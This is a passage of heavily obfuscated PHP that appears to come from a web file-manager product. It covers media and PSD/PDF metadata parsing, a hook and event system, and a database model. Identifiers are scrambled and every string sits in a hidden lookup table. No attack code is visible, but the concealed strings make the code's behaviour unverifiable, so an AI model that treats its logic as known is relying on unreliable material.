$bñ­–…À¡Â = preg_match($B¯íÂ­¶“[1593], substr($a¶§ñÄæ, $bÖĞË§Ï¢È), $cÜë¶¯¨¸); if ($B¯íÂ­¶“[923] == $D§á¸¨¥ò· && 1 == $bñ­–…À¡Â) { $D·šÍ¿ÛäÒ = strtr($cÜë¶¯¨¸[1], $B¯íÂ­¶“[1594], $B¯íÂ­¶“[33]); $bÖĞË§Ï¢È += \strlen($cÜë¶¯¨¸[0]); } elseif (!1 !== ($A¿Î´÷êˆ = strpos($a¶§ñÄæ, $B¯íÂ­¶“[926], $bÖĞË§Ï¢È))) { $bÖĞË§Ï¢È = $A¿Î´÷êˆ + 1; } } break; default: if ($B¯íÂ­¶“[1595] == substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 6)) { $f Îğ™íë¤ = $B¯íÂ­¶“[1595]; $bÖĞË§Ï¢È += 6; } elseif ($B¯íÂ­¶“[99] == substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 4)) { $f Îğ™íë¤ = $B¯íÂ­¶“[99]; $bÖĞË§Ï¢È += 4; $D·šÍ¿ÛäÒ = $B¯íÂ­¶“[99]; } elseif ($B¯íÂ­¶“[1596] == substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 4)) { $f Îğ™íë¤ = $B¯íÂ­¶“[1597]; $bÖĞË§Ï¢È += 4; $D·šÍ¿ÛäÒ = $B¯íÂ­¶“[1596]; } elseif ($B¯íÂ­¶“[1598] == substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 5)) { $f Îğ™íë¤ = $B¯íÂ­¶“[1597]; $bÖĞË§Ï¢È += 5; $D·šÍ¿ÛäÒ = $B¯íÂ­¶“[1598]; } elseif ($B¯íÂ­¶“[1599] == substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 6)) { $f Îğ™íë¤ = $B¯íÂ­¶“[1599]; $bÖĞË§Ï¢È += 6; if (1 == preg_match($B¯íÂ­¶“[1600], substr($a¶§ñÄæ, $bÖĞË§Ï¢È), $cÜë¶¯¨¸)) { $bÖĞË§Ï¢È += strlen($cÜë¶¯¨¸[0]); $Bï˜’ô‡ = $B¯íÂ­¶“[1601]; $bñ­–…À¡Â = preg_match($Bï˜’ô‡, substr($a¶§ñÄæ, $bÖĞË§Ï¢È), $cÜë¶¯¨¸, PREG_OFFSET_CAPTURE); if (1 == $bñ­–…À¡Â) { $D·šÍ¿ÛäÒ = substr($a¶§ñÄæ, $bÖĞË§Ï¢È, $cÜë¶¯¨¸[0][1]); $bÖĞË§Ï¢È += $cÜë¶¯¨¸[1][1]; } } } elseif ($B¯íÂ­¶“[1602] == substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 9)) { $f Îğ™íë¤ = $B¯íÂ­¶“[1602]; $bÖĞË§Ï¢È += 9; } elseif (1 == preg_match($B¯íÂ­¶“[1603], substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 33), $cÜë¶¯¨¸)) { $f Îğ™íë¤ = $B¯íÂ­¶“[1565]; $bÖĞË§Ï¢È += strlen($cÜë¶¯¨¸[0]); $D·šÍ¿ÛäÒ = intval($cÜë¶¯¨¸[1]) . $B¯íÂ­¶“[70] . intval($cÜë¶¯¨¸[2]); } elseif (1 == preg_match($B¯íÂ­¶“[1604], substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 33), $cÜë¶¯¨¸)) { $f Îğ™íë¤ = $B¯íÂ­¶“[1605]; $D·šÍ¿ÛäÒ = intval($cÜë¶¯¨¸[1]) . $B¯íÂ­¶“[70] . intval($cÜë¶¯¨¸[2]); $bÖĞË§Ï¢È += strlen($cÜë¶¯¨¸[0]); } elseif (($F•ëËä†Ì³ = strspn($a¶§ñÄæ, $B¯íÂ­¶“[1606], $bÖĞË§Ï¢È)) > 0) { $f Îğ™íë¤ = $B¯íÂ­¶“[1607]; $D·šÍ¿ÛäÒ = substr($a¶§ñÄæ, $bÖĞË§Ï¢È, $F•ëËä†Ì³); $bÖĞË§Ï¢È += $F•ëËä†Ì³; } break; } goto e°õÁÍ”ŠŒ; e°õÁÍ”ŠŒ: return array($f Îğ™íë¤, $D·šÍ¿ÛäÒ, $bÖĞË§Ï¢È); goto fâÉó‡¿„—; fâÉó‡¿„—: } } class GetInfo { private static $fileTypeArray; public static function get($eÎ¼‹¢Š³) { $A…ÂÊ±“ïä = IO::info($eÎ¼‹¢Š³); return self::infoAdd($A…ÂÊ±“ïä); } public static function infoAdd(&$cª–ˆ¯èùÇ) { goto C÷ÀÌÊèì; CÅ¨˜…¢£: $e‚îøçù‡[$Aİ‹Å®·ö¦[381]] = $BÁóõôŒİø; $cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[435]] = $e‚îøçù‡; return $cª–ˆ¯èùÇ; goto BŸî‘¢‡æ; b¨¡ŠÉ…œ­: $BÁóõôŒİø = $cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[160]]; try { if ($cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[160]] == $Aİ‹Å®·ö¦[1610]) { $e‚îøçù‡ = self::psdParse($A¾³‰¹Ã°Ä); $BÁóõôŒİø = $Aİ‹Å®·ö¦[1611]; } else { if ($cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[160]] == $Aİ‹Å®·ö¦[1612]) { $e‚îøçù‡ = self::pdfParse($A¾³‰¹Ã°Ä); } else { $BÁóõôŒİø = self::$fileTypeArray[$Aİ‹Å®·ö¦[1613]][$cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[160]]]; $báĞ·‰­¬ = self::$fileTypeArray[$Aİ‹Å®·ö¦[1614]][$BÁóõôŒİø][$Aİ‹Å®·ö¦[1615]]; $Dã©ÑĞ—Æ = @$DĞ˜´®™Å‹->analyze($A¾³‰¹Ã°Ä, $cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[77]], $cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[28]]); $e‚îøçù‡ = self::parseData($Dã©ÑĞ—Æ, $báĞ·‰­¬, $cª–ˆ¯èùÇ); } } } catch (Exception $CÒ„†ö) { $e‚îøçù‡ = array($Aİ‹Å®·ö¦[381] => $BÁóõôŒİø); } if (!$e‚îøçù‡) { return; } goto CÅ¨˜…¢£; a¹ÌáÃ«Ğå: if (!$cª–ˆ¯èùÇ || $cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[29]] != $Aİ‹Å®·ö¦[167]) { return; } if (!self::support($cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[160]]) || isset($cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[435]])) { return; } $A¾³‰¹Ã°Ä = $Aİ‹Å®·ö¦[1609] . $cª–ˆ¯èùÇ[$Aİ‹Å®·ö¦[75]]; goto b¨¡ŠÉ…œ­; C÷ÀÌÊèì: $Aİ‹Å®·ö¦ =& $_SERVER[í…¶]; static $DĞ˜´®™Å‹; if (!$DĞ˜´®™Å‹) { require SDK_DIR . $Aİ‹Å®·ö¦[1608]; $DĞ˜´®™Å‹ = new getID3(); } goto a¹ÌáÃ«Ğå; BŸî‘¢‡æ: } public static function support($fšãÄ¾ùœ) { goto c˜È²ö‹³; D§”‚«‘ˆ›: $BàŠ·Ö‡Ê¦ = array($CåÇšäéñÂ[1612], $CåÇšäéñÂ[1610]); if (in_array($fšãÄ¾ùœ, $BàŠ·Ö‡Ê¦)) { return !0; } if (isset(self::$fileTypeArray[$CåÇšäéñÂ[1613]][$fšãÄ¾ùœ])) { return !0; } goto A¿Ğ¯‘µ¹‘; c˜È²ö‹³: $CåÇšäéñÂ =& $_SERVER[í…¶]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $fšãÄ¾ùœ = strtolower($fšãÄ¾ùœ); goto D§”‚«‘ˆ›; A¿Ğ¯‘µ¹‘: return !1; goto b“ì„¤÷êŸ; b“ì„¤÷êŸ: } private static function parseData($F½õ¬ª¿’Ú, $eéÚò Äƒ–, $A§Ûî¨ğó) { $CŸÄËŞÎÏ‚ =& $_SERVER[í…¶]; $b‹š¨ù»›® = $F½õ¬ª¿’Ú[$CŸÄËŞÎÏ‚[1616]]; $DÓªÎ”Ù‡æ = array(); foreach ($eéÚò Äƒ– as $Bñ¢”½î“ => $eƒ•êÒ¹§ò) { foreach ($eƒ•êÒ¹§ò as $d°­ƒÅµ¢º) { if (is_array($d°­ƒÅµ¢º)) { $eÇ“Ù‹—ù” = self::parseData($F½õ¬ª¿’Ú, $eƒ•êÒ¹§ò, $A§Ûî¨ğó); if ($eÇ“Ù‹—ù”) { $DÓªÎ”Ù‡æ[$Bñ¢”½î“] = $eÇ“Ù‹—ù”; } break; } $AõÎ·´ğèå = str_replace($CŸÄËŞÎÏ‚[1386], $b‹š¨ù»›®, $d°­ƒÅµ¢º); $eÇ“Ù‹—ù” = _get($F½õ¬ª¿’Ú, $AõÎ·´ğèå); $eÇ“Ù‹—ù” = is_array($eÇ“Ù‹—ù”) ? $eÇ“Ù‹—ù”[0] : $eÇ“Ù‹—ù”; if ($eÇ“Ù‹—ù”) { break; } } if ($eÇ“Ù‹—ù” || $eÇ“Ù‹—ù” === 0 || $eÇ“Ù‹—ù” === !1) { $eÇ“Ù‹—ù” = self::valueReset($d°­ƒÅµ¢º, $eÇ“Ù‹—ù”, $Bñ¢”½î“); if ($eÇ“Ù‹—ù” !== null) { $DÓªÎ”Ù‡æ[$Bñ¢”½î“] = $eÇ“Ù‹—ù”; } } } $DÓªÎ”Ù‡æ = self::valueResetAll($DÓªÎ”Ù‡æ, $A§Ûî¨ğó); return $DÓªÎ”Ù‡æ; } private static function psdParse($CÆºùùÕ‹) { $FŠ‰ˆ‹éÖ™ =& $_SERVER[í…¶]; if (IO::fileSubstr($CÆºùùÕ‹, 0, 4) != $FŠ‰ˆ‹éÖ™[1617]) { return !1; } $Bº‘ÓÎ†ëõ = getImageSize($CÆºùùÕ‹, $Cİ«¸ê‹ÇÏ); if (!$Bº‘ÓÎ†ëõ) { return; } $EĞÑßéòÍ = array($FŠ‰ˆ‹éÖ™[1532] => $Bº‘ÓÎ†ëõ[0], $FŠ‰ˆ‹éÖ™[1534] => $Bº‘ÓÎ†ëõ[1]); return $EĞÑßéòÍ; } private static function pdfParse($E‚†Üóƒ”™) { return FileParsePdf::parse($E‚†Üóƒ”™); } private static function fileTypeParse() { $E¸ï—´İå =& $_SERVER[í…¶]; $e¹ç´®ò§ = self::fileTypeArray(); $f×Ò¶Åæá = array(); foreach ($e¹ç´®ò§ as $aßÊØÔ¤ğŒ => $CµÓÜÉ­ÉÂ) { $dî¼ª¨×Äˆ = _get($CµÓÜÉ­ÉÂ, $E¸ï—´İå[160], $E¸ï—´İå[33]); $Eñ—¼®ª·ª = is_string($dî¼ª¨×Äˆ) ? explode($E¸ï—´İå[47], $dî¼ª¨×Äˆ) : $dî¼ª¨×Äˆ; if (!$Eñ—¼®ª·ª) { continue; } foreach ($Eñ—¼®ª·ª as $dî¼ª¨×Äˆ) { $dî¼ª¨×Äˆ = strtolower(trim($dî¼ª¨×Äˆ)); if (!$dî¼ª¨×Äˆ) { continue; } $f×Ò¶Åæá[$dî¼ª¨×Äˆ] = $aßÊØÔ¤ğŒ; } $e¹ç´®ò§[$aßÊØÔ¤ğŒ][$E¸ï—´İå[160]] = array_keys($f×Ò¶Åæá); $e¹ç´®ò§[$aßÊØÔ¤ğŒ][$E¸ï—´İå[1615]] = self::parseKeyMap($CµÓÜÉ­ÉÂ[$E¸ï—´İå[1615]]); } return array($E¸ï—´İå[1614] => $e¹ç´®ò§, $E¸ï—´İå[1613] => $f×Ò¶Åæá); } private static function parseKeyMap($fÙ±ÓÃº) { $a”Ü‡¤ß =& $_SERVER[í…¶]; foreach ($fÙ±ÓÃº as $A¦·´ÚôÉ => $d»–ŠĞ‡ê‹) { if (is_array($d»–ŠĞ‡ê‹)) { $cãğò§¥È = self::parseKeyMap($d»–ŠĞ‡ê‹); if ($cãğò§¥È) { $fÙ±ÓÃº[$A¦·´ÚôÉ] = $cãğò§¥È; } continue; } $FŠù‘°ÚæÊ = explode($a”Ü‡¤ß[47], $d»–ŠĞ‡ê‹); $Eì¯ñÙ—‘À = array(); foreach ($FŠù‘°ÚæÊ as $d™„èÖ¤­Ù) { $d™„èÖ¤­Ù = trim($d™„èÖ¤­Ù); if (!$d™„èÖ¤­Ù) { continue; } if (preg_match($a”Ü‡¤ß[1618], $d™„èÖ¤­Ù, $E”Õä†ë‘ç)) { $d¤òæ‚Â–¡ = explode($a”Ü‡¤ß[271], $E”Õä†ë‘ç[1]); foreach ($d¤òæ‚Â–¡ as $Bç½¼¿å¼„) { $Eì¯ñÙ—‘À[] = str_replace($E”Õä†ë‘ç[0], $Bç½¼¿å¼„, $d™„èÖ¤­Ù); } } else { $Eì¯ñÙ—‘À[] = $d™„èÖ¤­Ù; } } $fÙ±ÓÃº[$A¦·´ÚôÉ] = $Eì¯ñÙ—‘À; } return $fÙ±ÓÃº; } private static function valueResetAll($d‚ó‚¦¾æ, $DÇÄ”¡Îª) { goto A•ËÙ´ÂÖĞ; A•ËÙ´ÂÖĞ: $fô¥•íÅ =& $_SERVER[í…¶]; if (isset($d‚ó‚¦¾æ[$fô¥•íÅ[1619]])) { $dÀƒÁÛ¥×÷ = ceil($d‚ó‚¦¾æ[$fô¥•íÅ[1619]]); $Bë˜Šªï§î = intval($dÀƒÁÛ¥×÷ / 3600); $Dí–©‰”“ = intval(($dÀƒÁÛ¥×÷ - $Bë˜Šªï§î * 3600) / 60); $eòŞ½“¤öæ = $dÀƒÁÛ¥×÷ % 60; $d‚ó‚¦¾æ[$fô¥•íÅ[1620]] = sprintf($fô¥•íÅ[1621], $Bë˜Šªï§î, $Dí–©‰”“, $eòŞ½“¤öæ); if ($Bë˜Šªï§î == 0) { $d‚ó‚¦¾æ[$fô¥•íÅ[1620]] = sprintf($fô¥•íÅ[1622], $Dí–©‰”“, $eòŞ½“¤öæ); } } $AæÜ§Ğ‰ = _get($d‚ó‚¦¾æ, $fô¥•íÅ[1623]); goto C™¥ë¤–; C™¥ë¤–: if ($AæÜ§Ğ‰) { $Aî²´Ü»ˆ = IO_PATH_SYSTEM_TEMP . $fô¥•íÅ[1624] . KodIO::hashPath($DÇÄ”¡Îª) . $fô¥•íÅ[1625]; $d‚ó‚¦¾æ[$fô¥•íÅ[1626]] = Action($fô¥•íÅ[1627])->pluginCacheFileSet($Aî²´Ü»ˆ, $AæÜ§Ğ‰); unset($d‚ó‚¦¾æ[$fô¥•íÅ[1628]][$fô¥•íÅ[1611]]); } $eÂŞ¯»‡çÂ = _get($d‚ó‚¦¾æ, $fô¥•íÅ[1629], $fô¥•íÅ[33]); $c«®©ò¶’Ó = _get($d‚ó‚¦¾æ, $fô¥•íÅ[1630], $fô¥•íÅ[33]); goto f¶Ä—×Ú›¬; f¶Ä—×Ú›¬: $E©× ·‡ â = _get($d‚ó‚¦¾æ, $fô¥•íÅ[1631], $fô¥•íÅ[33]); $b†ã·Ñ¹²¦ = $eÂŞ¯»‡çÂ . $c«®©ò¶’Ó . $E©× ·‡ â; if ($b†ã·Ñ¹²¦ && get_charset($b†ã·Ñ¹²¦) != $fô¥•íÅ[326]) { $d‚ó‚¦¾æ[$fô¥•íÅ[1628]][$fô¥•íÅ[1339]] = iconv_to($d‚ó‚¦¾æ[$fô¥•íÅ[1628]][$fô¥•íÅ[1339]], get_charset($b†ã·Ñ¹²¦), $fô¥•íÅ[326]); $d‚ó‚¦¾æ[$fô¥•íÅ[1628]][$fô¥•íÅ[1632]] = iconv_to($d‚ó‚¦¾æ[$fô¥•íÅ[1628]][$fô¥•íÅ[1632]], get_charset($b†ã·Ñ¹²¦), $fô¥•íÅ[326]); $d‚ó‚¦¾æ[$fô¥•íÅ[1628]][$fô¥•íÅ[1633]] = iconv_to($d‚ó‚¦¾æ[$fô¥•íÅ[1628]][$fô¥•íÅ[1633]], get_charset($b†ã·Ñ¹²¦), $fô¥•íÅ[326]); } goto E³§°‚Òçó; E³§°‚Òçó: return $d‚ó‚¦¾æ; goto D³½··÷¡Ä; D³½··÷¡Ä: } private static function valueReset($D„¾—”õî™, $aøõÊ«ß­ , $E½—¸ÄÅŒØ) { $dÃø„îè½ =& $_SERVER[í…¶]; $eÃîÃ‚õêô = $dÃø„îè½[1549]; switch ($D„¾—”õî™) { case $dÃø„îè½[1634]: $aøõÊ«ß­  = $aøõÊ«ß­  == $dÃø„îè½[83] ? $dÃø„îè½[1635] : $dÃø„îè½[1636]; break; case $dÃø„îè½[1637]: $aøõÊ«ß­  = $aøõÊ«ß­  ? $aøõÊ«ß­  : null; break; default: break; } switch ($E½—¸ÄÅŒØ) { case $dÃø„îè½[1638]: $aøõÊ«ß­  = round($aøõÊ«ß­ , 2); break; case $dÃø„îè½[187]: case $dÃø„îè½[107]: if ($aøõÊ«ß­  < 0) { $aøõÊ«ß­  = null; } else { if (is_numeric($aøõÊ«ß­ )) { $aøõÊ«ß­  = date($eÃîÃ‚õêô, $aøõÊ«ß­ ); } } break; default: break; } return $aøõÊ«ß­ ; } private static function fileTypeArray() { $b—ÁÜİğ›Õ =& $_SERVER[í…¶]; return array($b—ÁÜİğ›Õ[1611] => array($b—ÁÜİğ›Õ[160] => $b—ÁÜİğ›Õ[1639] . $b—ÁÜİğ›Õ[1640], $b—ÁÜİğ›Õ[1615] => array($b—ÁÜİğ›Õ[1532] => $b—ÁÜİğ›Õ[1641], $b—ÁÜİğ›Õ[1534] => $b—ÁÜİğ›Õ[1642], $b—ÁÜİğ›Õ[1643] => $b—ÁÜİğ›Õ[1644], $b—ÁÜİğ›Õ[1645] => $b—ÁÜİğ›Õ[1646], $b—ÁÜİğ›Õ[187] => $b—ÁÜİğ›Õ[1647], $b—ÁÜİğ›Õ[107] => $b—ÁÜİğ›Õ[1648], $b—ÁÜİğ›Õ[1649] => $b—ÁÜİğ›Õ[1650], $b—ÁÜİğ›Õ[1651] => $b—ÁÜİğ›Õ[1652], $b—ÁÜİğ›Õ[1653] => $b—ÁÜİğ›Õ[1654], $b—ÁÜİğ›Õ[1655] => $b—ÁÜİğ›Õ[1656], $b—ÁÜİğ›Õ[1657] => $b—ÁÜİğ›Õ[1658], $b—ÁÜİğ›Õ[1659] => $b—ÁÜİğ›Õ[1660], $b—ÁÜİğ›Õ[1661] => $b—ÁÜİğ›Õ[1662], $b—ÁÜİğ›Õ[1663] => array($b—ÁÜİğ›Õ[1664] => $b—ÁÜİğ›Õ[1665], $b—ÁÜİğ›Õ[1666] => $b—ÁÜİğ›Õ[1667], $b—ÁÜİğ›Õ[1668] => $b—ÁÜİğ›Õ[1669]), $b—ÁÜİğ›Õ[1670] => $b—ÁÜİğ›Õ[1671], $b—ÁÜİğ›Õ[1672] => $b—ÁÜİğ›Õ[1673], $b—ÁÜİğ›Õ[1674] => $b—ÁÜİğ›Õ[1675], $b—ÁÜİğ›Õ[1676] => $b—ÁÜİğ›Õ[1677], $b—ÁÜİğ›Õ[1678] => array($b—ÁÜİğ›Õ[1679] => $b—ÁÜİğ›Õ[1680], $b—ÁÜİğ›Õ[1681] => $b—ÁÜİğ›Õ[1682], $b—ÁÜİğ›Õ[1683] => $b—ÁÜİğ›Õ[1684], $b—ÁÜİğ›Õ[1685] => $b—ÁÜİğ›Õ[1686], $b—ÁÜİğ›Õ[1687] => $b—ÁÜİğ›Õ[1688], $b—ÁÜİğ›Õ[1689] => $b—ÁÜİğ›Õ[1690], $b—ÁÜİğ›Õ[1691] => $b—ÁÜİğ›Õ[1692], $b—ÁÜİğ›Õ[1693] => $b—ÁÜİğ›Õ[1694], $b—ÁÜİğ›Õ[1695] => $b—ÁÜİğ›Õ[1696], $b—ÁÜİğ›Õ[1697] => $b—ÁÜİğ›Õ[1698], $b—ÁÜİğ›Õ[1699] => $b—ÁÜİğ›Õ[1700]))), $b—ÁÜİğ›Õ[1701] => array($b—ÁÜİğ›Õ[160] => $b—ÁÜİğ›Õ[1702] . $b—ÁÜİğ›Õ[1703], $b—ÁÜİğ›Õ[1615] => array($b—ÁÜİğ›Õ[1619] => $b—ÁÜİğ›Õ[1704], $b—ÁÜİğ›Õ[187] => $b—ÁÜİğ›Õ[1705], $b—ÁÜİğ›Õ[107] => $b—ÁÜİğ›Õ[1706], $b—ÁÜİğ›Õ[1651] => $b—ÁÜİğ›Õ[1707], $b—ÁÜİğ›Õ[1708] => $b—ÁÜİğ›Õ[1709], $b—ÁÜİğ›Õ[1710] => $b—ÁÜİğ›Õ[1637], $b—ÁÜİğ›Õ[1711] => $b—ÁÜİğ›Õ[1712], $b—ÁÜİğ›Õ[1713] => $b—ÁÜİğ›Õ[1714], $b—ÁÜİğ›Õ[1715] => $b—ÁÜİğ›Õ[1716], $b—ÁÜİğ›Õ[1628] => array($b—ÁÜİğ›Õ[1339] => $b—ÁÜİğ›Õ[1717], $b—ÁÜİğ›Õ[1632] => $b—ÁÜİğ›Õ[1718], $b—ÁÜİğ›Õ[1633] => $b—ÁÜİğ›Õ[1719], $b—ÁÜİğ›Õ[1720] => $b—ÁÜİğ›Õ[1721], $b—ÁÜİğ›Õ[1722] => $b—ÁÜİğ›Õ[1723], $b—ÁÜİğ›Õ[1724] => $b—ÁÜİğ›Õ[1725], $b—ÁÜİğ›Õ[1611] => $b—ÁÜİğ›Õ[1726]))), $b—ÁÜİğ›Õ[1727] => array($b—ÁÜİğ›Õ[160] => $b—ÁÜİğ›Õ[1728] . $b—ÁÜİğ›Õ[1729], $b—ÁÜİğ›Õ[1615] => array($b—ÁÜİğ›Õ[1532] => $b—ÁÜİğ›Õ[1730], $b—ÁÜİğ›Õ[1534] => $b—ÁÜİğ›Õ[1731], $b—ÁÜİğ›Õ[1619] => $b—ÁÜİğ›Õ[1704], $b—ÁÜİğ›Õ[187] => $b—ÁÜİğ›Õ[1732], $b—ÁÜİğ›Õ[107] => $b—ÁÜİğ›Õ[1733], $b—ÁÜİğ›Õ[1638] => $b—ÁÜİğ›Õ[1734], $b—ÁÜİğ›Õ[1715] => $b—ÁÜİğ›Õ[1735], $b—ÁÜİğ›Õ[1711] => $b—ÁÜİğ›Õ[1736], $b—ÁÜİğ›Õ[1651] => $b—ÁÜİğ›Õ[1737], $b—ÁÜİğ›Õ[1701] => array($b—ÁÜİğ›Õ[1710] => $b—ÁÜİğ›Õ[1637], $b—ÁÜİğ›Õ[1738] => $b—ÁÜİğ›Õ[1739], $b—ÁÜİğ›Õ[1708] => $b—ÁÜİğ›Õ[1709], $b—ÁÜİğ›Õ[1715] => $b—ÁÜİğ›Õ[1716], $b—ÁÜİğ›Õ[1711] => $b—ÁÜİğ›Õ[1740], $b—ÁÜİğ›Õ[1713] => $b—ÁÜİğ›Õ[1714]))), $b—ÁÜİğ›Õ[1741] => array($b—ÁÜİğ›Õ[1615] => array($b—ÁÜİğ›Õ[1742] => $b—ÁÜİğ›Õ[1743], $b—ÁÜİğ›Õ[1744] => $b—ÁÜİğ›Õ[1745])), $b—ÁÜİğ›Õ[1746] => array($b—ÁÜİğ›Õ[1615] => array())); } } class Hook { private static $events = array(); public static function get($D…ŠŸëğã÷ = false) { if (!$D…ŠŸëğã÷) { return self::$events; } else { return self::$events[$D…ŠŸëğã÷]; } } public static function apply($BºÀĞÂÏÜÚ, $fÓ°ˆÙ†Æ = array()) { $a°Œ‡Æ—÷ = ActionApply($BºÀĞÂÏÜÚ, $fÓ°ˆÙ†Æ); if (is_string($BºÀĞÂÏÜÚ)) { Hook::trigger($BºÀĞÂÏÜÚ); } return $a°Œ‡Æ—÷; } public static function bind($CÑ‡Œö»Åî, $aº°²°â¶—, $B”ÎÌøë“¾ = false) { $Dæ­–á•Ğ =& $_SERVER[í…¶]; if (!isset(self::$events[$CÑ‡Œö»Åî])) { self::$events[$CÑ‡Œö»Åî] = array(); } self::$events[$CÑ‡Œö»Åî][] = array($Dæ­–á•Ğ[1747] => $aº°²°â¶—, $Dæ­–á•Ğ[1748] => $B”ÎÌøë“¾, $Dæ­–á•Ğ[1749] => 0); } public static function once($AÕèŠĞÔîÁ, $c™»›áÕƒò) { self::bind($AÕèŠĞÔîÁ, $c™»›áÕƒò, !0); } public static function unbind($d¦‹““ñôÆ, $Eâ‚§ºò°• = false) { if (!$Eâ‚§ºò°•) { self::$events[$d¦‹““ñôÆ] = array(); return; } $e·•Ş§‘õ = self::$events[$d¦‹““ñôÆ]; self::$events[$d¦‹““ñôÆ] = array(); if (!is_array($e·•Ş§‘õ)) { return; } for ($Aˆ¦œŞ†É = 0; $Aˆ¦œŞ†É < count($e·•Ş§‘õ); $Aˆ¦œŞ†É++) { if ($e·•Ş§‘õ[$Aˆ¦œŞ†É][$_SERVER[í…¶][1747]] == $Eâ‚§ºò°•) { continue; } self::$events[$d¦‹““ñôÆ][] = $e·•Ş§‘õ[$Aˆ¦œŞ†É]; } } public static function filter($bŸÂàØêé, $e‚ Á²Ö) { goto còÅ¾ñ—ÉÕ; còÅ¾ñ—ÉÕ: $E—„‚Â¶¶ =& $_SERVER[í…¶]; $E³òÆ‚£½† = self::$events; if (!isset($E³òÆ‚£½†[$bŸÂàØêé])) { return $e‚ Á²Ö; } goto e¡Ã¥Ñ Â; e¡Ã¥Ñ Â: $CµŠé†ì” = $E³òÆ‚£½†[$bŸÂàØêé]; $B§¯ÇÎÛÅî = $e‚ Á²Ö; if (!is_array($CµŠé†ì”) || count($CµŠé†ì”) == 0) { return $B§¯ÇÎÛÅî; } goto f–ŠŸæ˜‹è; f–ŠŸæ˜‹è: for ($F¬¯Ô•±å = 0; $F¬¯Ô•±å < count($CµŠé†ì”); $F¬¯Ô•±å++) { $a÷ÃÚÊåî¦ = $CµŠé†ì”[$F¬¯Ô•±å]; if ($a÷ÃÚÊåî¦[$E—„‚Â¶¶[1748]] && $a÷ÃÚÊåî¦[$E—„‚Â¶¶[1749]] > 1) { continue; } self::$events[$bŸÂàØêé][$F¬¯Ô•±å][$E—„‚Â¶¶[1749]] = $a÷ÃÚÊåî¦[$E—„‚Â¶¶[1749]] + 1; $bò§Ò‹“™ = self::apply($a÷ÃÚÊåî¦[$E—„‚Â¶¶[1747]], array($B§¯ÇÎÛÅî)); if (gettype($bò§Ò‹“™) == gettype($B§¯ÇÎÛÅî)) { $B§¯ÇÎÛÅî = $bò§Ò‹“™; } } return $B§¯ÇÎÛÅî; goto FŒ·¡‘óƒ; FŒ·¡‘óƒ: } public static function trigger($d¬ê†ÎòÈ) { goto BŒõŸ†µçØ; FõáŒÁ‚ó‡: if (!isset($dÇÉ¢âÃ©[$d¬ê†ÎòÈ])) { return $C§î¹á÷ìé; } $cíÒÃ†…‹ = $dÇÉ¢âÃ©[$d¬ê†ÎòÈ]; if (!is_array($cíÒÃ†…‹) || count($cíÒÃ†…‹) == 0) { return $C§î¹á÷ìé; } goto EãğÑÚ—ğ; EãğÑÚ—ğ: $Dô“ª®È° = func_get_args(); array_shift($Dô“ª®È°); for ($FØÊğ†«ÓÙ = 0; $FØÊğ†«ÓÙ < count($cíÒÃ†…‹); $FØÊğ†«ÓÙ++) { $DÏèœ‰Ø‹° = $cíÒÃ†…‹[$FØÊğ†«ÓÙ]; if ($DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1748]] && $DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1749]] > 1) { continue; } if (defined($dÄ®‰¼’–™[1750]) && GLOBAL_LOG_HOOK) { write_log($d¬ê†ÎòÈ . $dÄ®‰¼’–™[1751] . $DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1747]], $dÄ®‰¼’–™[1752]); } self::$events[$d¬ê†ÎòÈ][$FØÊğ†«ÓÙ][$dÄ®‰¼’–™[1749]] = $DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1749]] + 1; $e¸ö÷›ŠÑº = self::apply($DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1747]], $Dô“ª®È°); if (defined($dÄ®‰¼’–™[1750]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $dÄ®‰¼’–™[1752]); if ($DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1749]] == 200) { $C‰­Şà™¹ñ = is_array($DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1747]]) ? json_encode_force($DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1747]]) : $DÏèœ‰Ø‹°[$dÄ®‰¼’–™[1747]]; write_log($dÄ®‰¼’–™[1753] . $d¬ê†ÎòÈ . $dÄ®‰¼’–™[1754] . $C‰­Şà™¹ñ, $dÄ®‰¼’–™[1755]); } } $C§î¹á÷ìé = is_null($e¸ö÷›ŠÑº) ? $C§î¹á÷ìé : $e¸ö÷›ŠÑº; } goto DïÊùø¦¯ñ; BŒõŸ†µçØ: $dÄ®‰¼’–™ =& $_SERVER[í…¶]; $dÇÉ¢âÃ© = self::$events; $C§î¹á÷ìé = !1; goto FõáŒÁ‚ó‡; DïÊùø¦¯ñ: return $C§î¹á÷ìé; goto eêÃ—ÎÑç; eêÃ—ÎÑç: } } goto BãïÃë“Ù; B•ÔèšíÀí: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($Cù‚‡Çåõ„) { $BÔ÷¶ˆƒ“‚ =& $_SERVER[í…¶]; return array($BÔ÷¶ˆƒ“‚[2486] => array(USER_ID, $BÔ÷¶ˆƒ“‚[2542])); } protected function listData() { $aÈÕğØõ‰İ =& $_SERVER[í…¶]; $d©éšŒ–• = array($aÈÕğØõ‰İ[1424] => USER_ID, $aÈÕğØõ‰İ[445] => array($aÈÕğØõ‰İ[2543], 0)); $Bƒ‚ ¡²º = $aÈÕğØõ‰İ[2544]; $dê§ãÇòÊ­ = $aÈÕğØõ‰İ[2545]; $cÖùÛëôÏ¹ = 